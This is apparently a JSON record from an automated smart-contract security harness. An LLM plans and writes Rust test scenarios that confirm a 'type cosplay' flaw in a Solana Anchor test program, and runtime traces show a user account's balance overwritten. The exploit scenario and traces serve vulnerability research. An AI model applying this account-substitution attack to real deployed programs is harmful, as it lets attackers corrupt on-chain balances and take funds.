@@ -1,0 +1,207 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: UserData.balance corrompido para 999 (era 500)",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2245,
+        "completion_tokens": 670,
+        "latency_s": 4.38
+      },
+      "raw": "{\n  \"plan\": \"O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. Vou preparar uma conta AdminConfig legítima com admin = authority e fee = 100, e uma conta UserData com authority = authority (mesmo layout de 40 bytes: Pubkey + u64). O baseline chama update_fee com a conta AdminConfig e deve ter sucesso. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig: como o campo authority da UserData coincide com o signer, a checagem de admin passa e o programa grava o novo fee nos bytes 40..48 da UserData, corrompendo-a. O efeito mede que o campo balance da UserData foi alterado para o valor de ataque, algo que o uso legítimo não faria.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet admin_config = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"AdminConfig\\\", &(authority, 100u64)),\\n    None,\\n);\\nlet user_data = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"UserData\\\", &(authority, 500u64)),\\n    None,\\n);\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(200u64,),\\n    vec![\\n        AccountMeta::new(env.program_id, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_baseline = vec![\\n    (env.program_id, admin_config.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet r_base = env.baseline(\\\"update_fee legitimo com AdminConfig\\\", &ix_baseline, &contas_baseline);\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(999u64,),\\n    vec![\\n        AccountMeta::new(env.program_id, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_attack = vec![\\n    (env.program_id, user_data.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com UserData no lugar de AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let user_after = after(&r, &env.program_id);\\n    env.effect(\\n        \\\"UserData.balance corrompido para 999 (era 500)\\\",\\n        read_u64(user_after.data(), 40) == 999u64,\\n    );\\n}\"\n}",
+      "plan": "O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. Vou preparar uma conta AdminConfig legítima com admin = authority e fee = 100, e uma conta UserData com authority = authority (mesmo layout de 40 bytes: Pubkey + u64). O baseline chama update_fee com a conta AdminConfig e deve ter sucesso. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig: como o campo authority da UserData coincide com o signer, a checagem de admin passa e o programa grava o novo fee nos bytes 40..48 da UserData, corrompendo-a. O efeito mede que o campo balance da UserData foi alterado para o valor de ataque, algo que o uso legítimo não faria.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet admin_config = account(\n    &env.program_id,\n    &anchor_account_data(\"AdminConfig\", &(authority, 100u64)),\n    None,\n);\nlet user_data = account(\n    &env.program_id,\n    &anchor_account_data(\"UserData\", &(authority, 500u64)),\n    None,\n);\n\nlet ix_baseline = env.anchor_ix(\n    \"update_fee\",\n    &(200u64,),\n    vec![\n        AccountMeta::new(env.program_id, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_baseline = vec![\n    (env.program_id, admin_config.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet r_base = env.baseline(\"update_fee legitimo com AdminConfig\", &ix_baseline, &contas_baseline);\n\nlet ix_attack = env.anchor_ix(\n    \"update_fee\",\n    &(999u64,),\n    vec![\n        AccountMeta::new(env.program_id, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_attack = vec![\n    (env.program_id, user_data.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com UserData no lugar de AdminConfig\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let user_after = after(&r, &env.program_id);\n    env.effect(\n        \"UserData.balance corrompido para 999 (era 500)\",\n        read_u64(user_after.data(), 40) == 999u64,\n    );\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo com AdminConfig",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 2862,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "9c0a4fa147093e4d",
+                "digest": "bb2574fd7d2eefb2",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com UserData no lugar de AdminConfig",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 2862,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "8bf8a7cbfddcd2dd",
+                "digest": "99fc91ec1e296c80",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:01:07.110983544Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at patterns/06-type-cosplay/anchor/src/lib.rs:55:41:     range end index 40 out of range for slice of length 0",
+        "runtime_trace": [
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 2862 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP failed: SBF program panicked",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 2862 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'update_fee legitimo com AdminConfig' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2753,
+        "completion_tokens": 654,
+        "latency_s": 3.94
+      },
+      "raw": "{\n  \"plan\": \"O baseline falhou porque a conta config foi passada com a chave do program_id, mas o programa espera uma conta mutável separada; além disso, o layout do AdminConfig tem discriminador de 8 bytes, admin em 8..40 e fee em 40..48. Vou criar uma conta AdminConfig com chave própria, dono program_id, e authority como signer. O ataque usará uma conta UserData no lugar de AdminConfig, com o mesmo authority, para testar type cosplay. O efeito medido será a alteração do campo balance da UserData (offset 40) para o novo fee, demonstrando que a instrução aceitou um tipo de conta errado.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet config_key = Pubkey::new_unique();\\nlet user_key = Pubkey::new_unique();\\n\\nlet admin_config = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"AdminConfig\\\", &(authority, 100u64)),\\n    None,\\n);\\nlet user_data = account(\\n    &env.program_id,\\n    &anchor_account_data(\\\"UserData\\\", &(authority, 500u64)),\\n    None,\\n);\\n\\nlet ix_baseline = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(200u64,),\\n    vec![\\n        AccountMeta::new(config_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_baseline = vec![\\n    (config_key, admin_config.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet r_base = env.baseline(\\\"update_fee legitimo com AdminConfig\\\", &ix_baseline, &contas_baseline);\\n\\nlet ix_attack = env.anchor_ix(\\n    \\\"update_fee\\\",\\n    &(999u64,),\\n    vec![\\n        AccountMeta::new(user_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_attack = vec![\\n    (user_key, user_data.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet r = env.attack(\\\"update_fee com UserData no lugar de AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let user_after = after(&r, &user_key);\\n    env.effect(\\n        \\\"UserData.balance corrompido para 999 (era 500)\\\",\\n        read_u64(user_after.data(), 40) == 999u64,\\n    );\\n}\"\n}",
+      "plan": "O baseline falhou porque a conta config foi passada com a chave do program_id, mas o programa espera uma conta mutável separada; além disso, o layout do AdminConfig tem discriminador de 8 bytes, admin em 8..40 e fee em 40..48. Vou criar uma conta AdminConfig com chave própria, dono program_id, e authority como signer. O ataque usará uma conta UserData no lugar de AdminConfig, com o mesmo authority, para testar type cosplay. O efeito medido será a alteração do campo balance da UserData (offset 40) para o novo fee, demonstrando que a instrução aceitou um tipo de conta errado.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet config_key = Pubkey::new_unique();\nlet user_key = Pubkey::new_unique();\n\nlet admin_config = account(\n    &env.program_id,\n    &anchor_account_data(\"AdminConfig\", &(authority, 100u64)),\n    None,\n);\nlet user_data = account(\n    &env.program_id,\n    &anchor_account_data(\"UserData\", &(authority, 500u64)),\n    None,\n);\n\nlet ix_baseline = env.anchor_ix(\n    \"update_fee\",\n    &(200u64,),\n    vec![\n        AccountMeta::new(config_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_baseline = vec![\n    (config_key, admin_config.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet r_base = env.baseline(\"update_fee legitimo com AdminConfig\", &ix_baseline, &contas_baseline);\n\nlet ix_attack = env.anchor_ix(\n    \"update_fee\",\n    &(999u64,),\n    vec![\n        AccountMeta::new(user_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_attack = vec![\n    (user_key, user_data.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet r = env.attack(\"update_fee com UserData no lugar de AdminConfig\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let user_after = after(&r, &user_key);\n    env.effect(\n        \"UserData.balance corrompido para 999 (era 500)\",\n        read_u64(user_after.data(), 40) == 999u64,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo com AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "9c0a4fa147093e4d",
+                "digest": "bb2574fd7d2eefb2",
+                "post": "9c0a4fa147093e4d0000000000000001000000000000000000000000000000000000000000000000c800000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com UserData no lugar de AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "8bf8a7cbfddcd2dd",
+                "digest": "99fc91ec1e296c80",
+                "post": "8bf8a7cbfddcd2dd0000000000000001000000000000000000000000000000000000000000000000e703000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "UserData.balance corrompido para 999 (era 500)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: UserData.balance corrompido para 999 (era 500)"
+    }
+  ],
+  "case_id": "SSP-06-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Type Cosplay."
+  }
+}
